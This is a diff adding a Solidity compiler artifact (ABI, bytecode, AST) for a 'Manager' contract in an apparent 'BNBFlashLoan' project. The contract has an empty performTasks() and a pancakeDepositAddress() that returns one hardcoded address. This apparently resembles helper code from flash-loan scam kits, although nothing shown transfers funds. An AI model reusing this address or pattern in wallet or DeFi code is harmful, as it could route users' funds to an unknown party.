@@ -1,0 +1,239 @@
+{
+    "contracts": {
+        "/Users/abc/BNBFlashLoan/codemanager.sol": {
+            "Manager": {
+                "abi": [
+                    {
+                        "inputs": [],
+                        "name": "pancakeDepositAddress",
+                        "outputs": [
+                            {
+                                "internalType": "address",
+                                "name": "",
+                                "type": "address"
+                            }
+                        ],
+                        "stateMutability": "pure",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "performTasks",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    }
+                ],
+                "devdoc": {
+                    "methods": {}
+                },
+                "evm": {
+                    "bytecode": {
+                        "linkReferences": {},
+                        "object": "6080604052348015600f57600080fd5b5060b18061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80630c0f93a114603757806360b4d0c114603f575b600080fd5b603d6061565b005b60456063565b604080516001600160a01b039092168252519081900360200190f35b565b73f0c0b3094cfc45b8b0e71e8434583eea529e96e59056fea2646970667358221220a1a6df17a4d0ef6dc085bfedbf42f8b65d2970374c0cf289bf1adf106b951e7664736f6c63430006000033",
+                        "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xB1 DUP1 PUSH2 0x1E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xC0F93A1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0x60B4D0C1 EQ PUSH1 0x3F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x61 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x45 PUSH1 0x63 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST JUMP JUMPDEST PUSH20 0xF0C0B3094CFC45B8B0E71E8434583EEA529E96E5 SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG1 0xA6 0xDF OR LOG4 0xD0 0xEF PUSH14 0xC085BFEDBF42F8B65D2970374C0C CALLCODE DUP10 0xBF BYTE 0xDF LT PUSH12 0x951E7664736F6C6343000600 STOP CALLER ",
+                        "sourceMap": "25:186:0:-:0;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;25:186:0;;;;;;;"
+                    },
+                    "deployedBytecode": {
+                        "linkReferences": {},
+                        "object": "6080604052348015600f57600080fd5b506004361060325760003560e01c80630c0f93a114603757806360b4d0c114603f575b600080fd5b603d6061565b005b60456063565b604080516001600160a01b039092168252519081900360200190f35b565b73f0c0b3094cfc45b8b0e71e8434583eea529e96e59056fea2646970667358221220a1a6df17a4d0ef6dc085bfedbf42f8b65d2970374c0cf289bf1adf106b951e7664736f6c63430006000033",
+                        "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xC0F93A1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0x60B4D0C1 EQ PUSH1 0x3F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x61 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x45 PUSH1 0x63 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST JUMP JUMPDEST PUSH20 0xF0C0B3094CFC45B8B0E71E8434583EEA529E96E5 SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG1 0xA6 0xDF OR LOG4 0xD0 0xEF PUSH14 0xC085BFEDBF42F8B65D2970374C0C CALLCODE DUP10 0xBF BYTE 0xDF LT PUSH12 0x951E7664736F6C6343000600 STOP CALLER ",
+                        "sourceMap": "25:186:0:-:0;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;25:186:0;;;;;;;;;;;;;;;;;;;;;;;;45:41;;;:::i;:::-;;89:120;;;:::i;:::-;;;;-1:-1:-1;;;;;89:120:0;;;;;;;;;;;;;;45:41;:::o;89:120::-;163:42;89:120;:::o"
+                    },
+                    "gasEstimates": {
+                        "creation": {
+                            "codeDepositCost": "35400",
+                            "executionCost": "87",
+                            "totalCost": "35487"
+                        },
+                        "external": {
+                            "pancakeDepositAddress()": "219",
+                            "performTasks()": "122"
+                        }
+                    },
+                    "methodIdentifiers": {
+                        "pancakeDepositAddress()": "60b4d0c1",
+                        "performTasks()": "0c0f93a1"
+                    }
+                },
+                "metadata": "{\"compiler\":{\"version\":\"0.6.0+commit.26b70077\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"pancakeDepositAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"performTasks\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"/Users/abc/BNBFlashLoan/codemanager.sol\":\"Manager\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"/Users/abc/BNBFlashLoan/codemanager.sol\":{\"keccak256\":\"0x92d0b16d7a8086c91a4b0d9cc59bc6ed72dc9fc9b61263986aad7df1b611816e\",\"urls\":[\"bzz-raw://044a0b867ae4840d606b5fe888e9a237bab374d9904a75568904c2e9fd183f66\",\"dweb:/ipfs/QmbDYvaCPoFyr2bLbKHYhATiwPXS82SkMPzK2U4mRq72bx\"]}},\"version\":1}",
+                "storageLayout": {
+                    "storage": [],
+                    "types": null
+                },
+                "userdoc": {
+                    "methods": {}
+                }
+            }
+        }
+    },
+    "sources": {
+        "/Users/abc/BNBFlashLoan/codemanager.sol": {
+            "ast": {
+                "absolutePath": "/Users/abc/BNBFlashLoan/codemanager.sol",
+                "exportedSymbols": {
+                    "Manager": [
+                        14
+                    ]
+                },
+                "id": 15,
+                "nodeType": "SourceUnit",
+                "nodes": [
+                    {
+                        "id": 1,
+                        "literals": [
+                            "solidity",
+                            "^",
+                            "0.6",
+                            ".0"
+                        ],
+                        "nodeType": "PragmaDirective",
+                        "src": "0:23:0"
+                    },
+                    {
+                        "abstract": false,
+                        "baseContracts": [],
+                        "contractDependencies": [],
+                        "contractKind": "contract",
+                        "documentation": null,
+                        "fullyImplemented": true,
+                        "id": 14,
+                        "linearizedBaseContracts": [
+                            14
+                        ],
+                        "name": "Manager",
+                        "nodeType": "ContractDefinition",
+                        "nodes": [
+                            {
+                                "body": {
+                                    "id": 4,
+                                    "nodeType": "Block",
+                                    "src": "76:10:0",
+                                    "statements": []
+                                },
+                                "documentation": null,
+                                "functionSelector": "0c0f93a1",
+                                "id": 5,
+                                "implemented": true,
+                                "kind": "function",
+                                "modifiers": [],
+                                "name": "performTasks",
+                                "nodeType": "FunctionDefinition",
+                                "overrides": null,
+                                "parameters": {
+                                    "id": 2,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "66:2:0"
+                                },
+                                "returnParameters": {
+                                    "id": 3,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "76:0:0"
+                                },
+                                "scope": 14,
+                                "src": "45:41:0",
+                                "stateMutability": "nonpayable",
+                                "virtual": false,
+                                "visibility": "public"
+                            },
+                            {
+                                "body": {
+                                    "id": 12,
+                                    "nodeType": "Block",
+                                    "src": "152:57:0",
+                                    "statements": [
+                                        {
+                                            "expression": {
+                                                "argumentTypes": null,
+                                                "hexValue": "307866304330423330393463664334354238423045373165383433343538334545413532394539366535",
+                                                "id": 10,
+                                                "isConstant": false,
+                                                "isLValue": false,
+                                                "isPure": true,
+                                                "kind": "number",
+                                                "lValueRequested": false,
+                                                "nodeType": "Literal",
+                                                "src": "163:42:0",
+                                                "subdenomination": null,
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_address_payable",
+                                                    "typeString": "address payable"
+                                                },
+                                                "value": "0xf0C0B3094cfC45B8B0E71e8434583EEA529E96e5"
+                                            },
+                                            "functionReturnParameters": 9,
+                                            "id": 11,
+                                            "nodeType": "Return",
+                                            "src": "156:49:0"
+                                        }
+                                    ]
+                                },
+                                "documentation": null,
+                                "functionSelector": "60b4d0c1",
+                                "id": 13,
+                                "implemented": true,
+                                "kind": "function",
+                                "modifiers": [],
+                                "name": "pancakeDepositAddress",
+                                "nodeType": "FunctionDefinition",
+                                "overrides": null,
+                                "parameters": {
+                                    "id": 6,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "119:2:0"
+                                },
+                                "returnParameters": {
+                                    "id": 9,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [
+                                        {
+                                            "constant": false,
+                                            "id": 8,
+                                            "name": "",
+                                            "nodeType": "VariableDeclaration",
+                                            "overrides": null,
+                                            "scope": 13,
+                                            "src": "143:7:0",
+                                            "stateVariable": false,
+                                            "storageLocation": "default",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_address",
+                                                "typeString": "address"
+                                            },
+                                            "typeName": {
+                                                "id": 7,
+                                                "name": "address",
+                                                "nodeType": "ElementaryTypeName",
+                                                "src": "143:7:0",
+                                                "stateMutability": "nonpayable",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_address",
+                                                    "typeString": "address"
+                                                }
+                                            },
+                                            "value": null,
+                                            "visibility": "internal"
+                                        }
+                                    ],
+                                    "src": "142:9:0"
+                                },
+                                "scope": 14,
+                                "src": "89:120:0",
+                                "stateMutability": "pure",
+                                "virtual": false,
+                                "visibility": "public"
+                            }
+                        ],
+                        "scope": 15,
+                        "src": "25:186:0"
+                    }
+                ],
+                "src": "0:211:0"
+            },
+            "id": 0
+        }
+    }
+}
